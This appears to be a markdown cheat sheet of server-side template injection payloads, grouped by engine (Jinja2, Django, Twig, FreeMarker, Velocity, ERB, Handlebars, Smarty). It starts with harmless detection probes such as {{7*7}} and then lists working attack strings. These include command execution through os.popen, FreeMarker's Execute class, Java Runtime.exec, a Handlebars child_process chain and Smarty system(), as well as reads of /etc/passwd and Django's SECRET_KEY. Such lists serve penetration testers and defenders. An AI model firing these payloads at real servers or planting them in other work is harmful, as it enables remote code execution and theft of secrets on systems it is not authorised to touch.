# SSTI Payloads

---

## Basic Detection

```id="v1k3ms"
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
```

---

## Polyglot (Universal)

```id="w8r2qa"
${{<%[%'"}}%\.
```

---

## Error-Based Detection

```id="f9x7pl"
{{1/0}}
${1/0}
<%= 1/0 %>
```

---

## Boolean-Based (Blind)

```id="h2n6yr"
{{7*7}}
{{7*'a'}}

{{1==1}}
{{1==2}}
```

---

## Template Syntax Fuzzing

```id="c4m9ts"
{{test}}
${test}
#{test}
<%= test %>
{test}
{{=test}}
```

---

## Jinja2 / Flask

```id="p7v1kd"
{{7*7}}
{{7*'7'}}
{{config.items()}}
{{self}}
{{request}}
{{cycler.__init__.__globals__.os.popen('ls').read()}}
```

---

## Django

```id="n5u3qx"
{{7*7}}
{{settings}}
{{request}}
{{settings.SECRET_KEY}}
```

---

## Twig (PHP)

```id="b8r4yf"
{{7*7}}
{{dump()}}
{{app}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

---

## FreeMarker (Java)

```id="x6t2wp"
${7*7}
${"test"?upper_case}
${3*3}
${"freemarker.template.utility.Execute"?new()("ls")}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## Velocity (Java)

```id="q3e8zn"
#set($x=7*7)$x
#set($x="test")$x
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("ls"))
```

---

## ERB (Ruby)

```id="r1k9hs"
<%= 7*7 %>
<%= "test".upcase %>
<%= system("ls") %>
<%= `ls` %>
```

---

## Handlebars (Node.js)

```id="z5p2mx"
{{this}}
{{#each this}}{{this}}{{/each}}

{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').execSync('ls -la');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

---

## Smarty (PHP)

```id="d2w6gc"
{7*7}
{$smarty.version}
{php}system('ls'){/php}
```

---

## Command Execution

```id="g7n4rq"
{{os.system('ls')}}
{{os.popen('ls').read()}}
{{__import__('os').system('ls')}}
```

---

## File Read

```id="m8y1ke"
{{open('/etc/passwd').read()}}
{{__import__('os').popen('cat /etc/passwd').read()}}
```

---

## Useful Enumeration

```id="k9v3dp"
{{self}}
{{config}}
{{request}}
{{dir()}}
{{globals()}}
```

---
